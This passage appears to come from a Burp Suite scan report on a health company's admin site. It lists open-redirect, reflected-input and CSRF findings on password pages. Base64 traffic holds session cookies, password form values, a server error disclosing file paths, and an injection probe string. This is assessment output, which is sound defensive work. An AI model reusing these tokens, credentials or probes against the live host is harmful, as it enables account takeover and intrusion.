VsSDdIdFYxT2NNMVFIYkxZVTRnSXhCQ0RmNHh4VC9jWURCVUE5Q1NmKzU0azdnY25UMnhzNQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8753265434863889408</serialNumber>
    <type>5243152</type>
    <name><![CDATA[Open redirection (DOM-based)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/User/399/ChangePassword]]></path>
    <location><![CDATA[/User/399/ChangePassword]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>

<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using dynamic and static code analysis. Static analysis can lead to false positives that are not actually exploitable. If Burp Scanner has not provided any evidence resulting from dynamic analysis, you should review the relevant code and execution paths  to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/dom-based/open-redirection">Web Security Academy: Open redirection (DOM-based)</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to DOM-based open redirection. Data is read from <b>input.value</b> and passed to <b>xhr.open</b>.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyLzM5OS9DaGFuZ2VQYXNzd29yZCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9YzYydjhiMXQwMG4xZjcybGMzdGZjbW1yaHM7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPWw5Z0h6eVh4bW5nRHFTZkNJa1cvZWdTZ0J1dmJYQVk4clROczlITDVDNFZ3OE96c3hwZk1lNFZhZjhBTzltZWtJODcxcDRVbEg3SHRWMU9jTTFRSGJMWVU0Z0l4QkNEZjR4eFQvY1lEQlVBOUNTZis1NGs3Z2NuVDJ4czU7IEFXU0FMQkNPUlM9bDlnSHp5WHhtbmdEcVNmQ0lrVy9lZ1NnQnV2YlhBWThyVE5zOUhMNUM0Vnc4T3pzeHBmTWU0VmFmOEFPOW1la0k4NzFwNFVsSDdIdFYxT2NNMVFIYkxZVTRnSXhCQ0RmNHh4VC9jWURCVUE5Q1NmKzU0azdnY25UMnhzNQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <dynamicAnalysis>
      <source>input.value</source>
      <sink>xhr.open</sink>
      <sourceStackTrace>at Object.BQODu (&lt;anonymous&gt;:1:95774)
at Object.USBMk (&lt;anonymous&gt;:1:394438)
at HTMLInputElement.get (&lt;anonymous&gt;:1:398284)
at HTMLInputElement.get [as value] (&lt;anonymous&gt;:1:514193)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/User/399/ChangePassword:41:163)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sourceStackTrace>
      <sinkStackTrace>at Object.XMhUr (&lt;anonymous&gt;:1:544502)
at _0x13dcf0 (&lt;anonymous&gt;:1:558761)
at _0xdc6a5f.&lt;computed&gt;._0x13cc4d.oknbI._0x3e2633.XMLHttpRequest.&lt;computed&gt; [as open] (&lt;anonymous&gt;:1:458938)
at Object.send (https://admin.miradorhealth.com/js/jquery.min.js:4:26275)
at Function.ajax (https://admin.miradorhealth.com/js/jquery.min.js:4:22180)
at advSearch (https://admin.miradorhealth.com/js/scripts.js?v=f72d42:11:11)
at HTMLInputElement.onkeyup (https://admin.miradorhealth.com/User/399/ChangePassword:41:148)
at _0x372f23 (&lt;anonymous&gt;:1:148382)
at Object.NQWnL (&lt;anonymous&gt;:1:8863)
at _0x2a880c (&lt;anonymous&gt;:1:153429)
at Object.fEpIW (&lt;anonymous&gt;:1:94004)
at _0x4ca456 (&lt;anonymous&gt;:1:574787)</sinkStackTrace>
      <eventListenerStackTrace></eventListenerStackTrace>
      <sourceValue></sourceValue>
      <sinkValue>https://admin.miradorhealth.com/Search/r2uyy9ierk%2527%2522`&apos;&quot;/r2uyy9ierk/&gt;&lt;r2uyy9ierk/\&gt;oh88uhayt8&amp;</sinkValue>
      <eventHandlerData></eventHandlerData>
      <eventHandlerDataType></eventHandlerDataType>
      <eventHandlerManipulatedData></eventHandlerManipulatedData>
      <poc></poc>
      <origin></origin>
      <isOriginChecked>false</isOriginChecked>
      <sourceElementId></sourceElementId>
      <sourceElementName></sourceElementName>
      <eventFiredEventName>keyup</eventFiredEventName>
      <eventFiredElementId></eventFiredElementId>
      <eventFiredElementName></eventFiredElementName>
      <eventFiredOuterHtml>&lt;input class=&quot;form-control&quot; type=&quot;search&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot; onkeyup=&quot;advSearc</eventFiredOuterHtml>
    </dynamicAnalysis>
  </issue>
  <issue>
    <serialNumber>8092323837423493120</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/User/399/SavePassword]]></path>
    <location><![CDATA[/User/399/SavePassword [URL path folder 2]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path folder 2 is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlci8zOTkycjUzcXNvYWh0L1NhdmVQYXNzd29yZCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPTFkaWxvaGlsZDA2cTZlZWJuMXU5MmpjZ2w4OyBzY3JlZW5XaWR0aD04MDA7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj13ZzJpcVl3aUE0NWhVb0pwa1RkZjlCejN6VmlNa0MydUJYcU9ZbC9zcUx5bzl3RGdBa1QvSnR0aTIxZEV0ZktTQjREUUMzdS9JKzd3Zko1UFN3aWVEZ01hcmQyM3JyQUwvZ21oYTFQMFpna3RHM3luUC9XV0NkUThSS0oxOyBBV1NBTEJDT1JTPXdnMmlxWXdpQTQ1aFVvSnBrVGRmOUJ6M3pWaU1rQzJ1QlhxT1lsL3NxTHlvOXdEZ0FrVC9KdHRpMjFkRXRmS1NCNERRQzN1L0krN3dmSjVQU3dpZURnTWFyZDIzcnJBTC9nbWhhMVAwWmdrdEczeW5QL1dXQ2RROFJLSjENCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlci8zOTkvQ2hhbmdlUGFzc3dvcmQNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KQ29udGVudC1MZW5ndGg6IDYyDQoNCmNwYXNzd29yZD1CYWglNDAxMDExJnBhc3N3b3JkPUJhaCU0MDEwMTEmY2ZwYXNzd29yZD1CYWglNDAxMDEx]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1ODoyNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMzkyDQpTZXQtQ29va2llOiBBV1NBTEI9bE1EbGdHWlRHd3VQM00ycUlTTWFFRkN3Nm04VUEwZDFuVWpLK2dQdEtobVVRSmZ1YTVTYklpb2w0b2J6TEw0VEZvUlYvc3FGY29nL3JQc2VZcXhZZFFuRmRBdjZULzU5S0JjTVVhcDNrZDFZTm9SUmhhR3h0emNNM1gvNTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU4OjI2IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWxNRGxnR1pUR3d1UDNNMnFJU01hRUZDdzZtOFVBMGQxblVqSytnUHRLaG1VUUpmdWE1U2JJaW9sNG9iekxMNFRGb1JWL3NxRmNvZy9yUHNlWXF4WWRRbkZkQXY2VC81OUtCY01VYXAza2QxWU5vUlJoYUd4dHpjTTNYLzU7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1ODoyNiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBFcnJvcjogQXR0ZW1wdCB0byBhc3NpZ24gcHJvcGVydHkgJnF1b3Q7Y29kZSZxdW90OyBvbiBudWxsIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vY29udHJvbGxlci9Vc2VyQ29udHJvbGxlci5waHA6Mzg5ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxNDYpOiBVc2VyQ29udHJvbGxlci0mZ3Q7c2F2ZVBhc3N3b3JkKCczOTkycjUzcXNvYWh0JywgQXJyYXkpCiMxIHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlckNvbnRyb2xsZXIucGhwPC9iPiBvbiBsaW5lIDxiPjM4OTwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7357327966204468224</serialNumber>
    <type>2098944</type>
    <name><![CDATA[Cross-site request forgery]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/User/399/SavePassword]]></path>
    <location><![CDATA[/User/399/SavePassword]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li><li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li><li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlci8zOTkvU2F2ZVBhc3N3b3JkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9MWRpbG9oaWxkMDZxNmVlYm4xdTkyamNnbDg7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPUp3WDFXV1hpZWFNeHZaWGs0UU84cURrL1ErK3VMNkpjenhDc0dVNnE4ODJDN3VySHU3VmZuVGFRTXFmbWJlbUp4dXFBMkkzUFpzNUt3aHBzRlFObTFBTVFqeHp3S0NMZnFOOSt0aEtYR2FmcGFMbHY3MzlJdmlrZTVDaVY7IEFXU0FMQkNPUlM9SndYMVdXWGllYU14dlpYazRRTzhxRGsvUSsrdUw2SmN6eENzR1U2cTg4MkM3dXJIdTdWZm5UYVFNcWZtYmVtSnh1cUEySTNQWnM1S3docHNGUU5tMUFNUWp4endLQ0xmcU45K3RoS1hHYWZwYUxsdjczOUl2aWtlNUNpVg0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyLzM5OS9DaGFuZ2VQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KY3Bhc3N3b3JkPUJhaCU0MDEwMTEmcGFzc3dvcmQ9QmFoJTQwMTAxMSZjZnBhc3N3b3JkPUJhaCU0MDEwMTE=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MTozMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQNClNldC1Db29raWU6IEFXU0FMQj01SmU0emF2NzJQWGhoYWMrcEN3K2NuUjlHWVdmdGRTMXZvd1J3dGdBQnZYd2toWEttVUtVaVR2d0hINlBlcGZteGZkd1pkcUlrTWlPYVZTQXBOSnBNb1hNTjhFdHVGeTdmNG1ZUm1pQWlqTERzYVJWY1J4RG5Oc1pjRkdhOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTE6MzAgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9NUplNHphdjcyUFhoaGFjK3BDdytjblI5R1lXZnRkUzF2b3dSd3RnQUJ2WHdraFhLbVVLVWlUdndISDZQZXBmbXhmZHdaZHFJa01pT2FWU0FwTkpwTW9YTU44RXR1Rnk3ZjRtWVJtaUFpakxEc2FSVmNSeERuTnNaY0ZHYTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUxOjMwIEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiQ29uZ3JhdHVsYXRpb25zISBZb3VyIHBhc3N3b3JkIGhhcyBiZWVuIHVwZGF0ZWQgc3VjY2Vzc2Z1bGx5LiJ9]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlci8zOTkvU2F2ZVBhc3N3b3JkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9MWRpbG9oaWxkMDZxNmVlYm4xdTkyamNnbDg7IHNjcmVlbldpZHRoPTgwMDsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYXNoYm9hcmREYXRlUmFuZ2U9TW9udGhseTsgQVdTQUxCPS9SMm0zSFFsUEoxOE5nZ3E3eEpTamlOK044bGY4YVc1clp4Q0RyMEEzMWVwZ2dZRW1abHNRb2o2K01HMUZQSXpTeFFOK01sM3NIU3g5YWYzNmlPT2RNaUlFY1czclVuc2k5OGhYTVdLaWxEU3VyQitwMWx2K3F5UUJ5cEM7IEFXU0FMQkNPUlM9L1IybTNIUWxQSjE4TmdncTd4SlNqaU4rTjhsZjhhVzVyWnhDRHIwQTMxZXBnZ1lFbVpsc1FvajYrTUcxRlBJelN4UU4rTWwzc0hTeDlhZjM2aU9PZE1pSUVjVzNyVW5zaTk4aFhNV0tpbERTdXJCK3AxbHYrcXlRQnlwQw0KT3JpZ2luOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tDQpYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdA0KUmVmZXJlcjogaHR0cHM6Ly9JQUV0aGlPZXBpRGFIQk1LdXZDLmNvbS9Vc2VyLzM5OS9DaGFuZ2VQYXNzd29yZA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KY3Bhc3N3b3JkPUJhaCU0MDEwMTEmcGFzc3dvcmQ9QmFoJTQwMTAxMSZjZnBhc3N3b3JkPUJhaCU0MDEwMTE=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OTowOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQNClNldC1Db29raWU6IEFXU0FMQj04N3Y0YUR4b0ZwTHBaWXBSdFBReTI3K1VBcGNoRU1FWFdLUWtrWFJDUE85MnFJS01GdFBLeEpzYjJyNjVXY2NFRk5TV3ZpZHFlUTZ0WldoT3pGd0FnU0g3NUQzblJoQnZIWDArNTFjWXZKYW9XRmdqRnVRYlI4eHdtWGtxOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTk6MDggR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9ODd2NGFEeG9GcExwWllwUnRQUXkyNytVQXBjaEVNRVhXS1Fra1hSQ1BPOTJxSUtNRnRQS3hKc2IycjY1V2NjRUZOU1d2aWRxZVE2dFpXaE96RndBZ1NINzVEM25SaEJ2SFgwKzUxY1l2SmFvV0ZnakZ1UWJSOHh3bVhrcTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjA4IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJjb2RlIjowLCJtZXNzYWdlIjoiQ29uZ3JhdHVsYXRpb25zISBZb3VyIHBhc3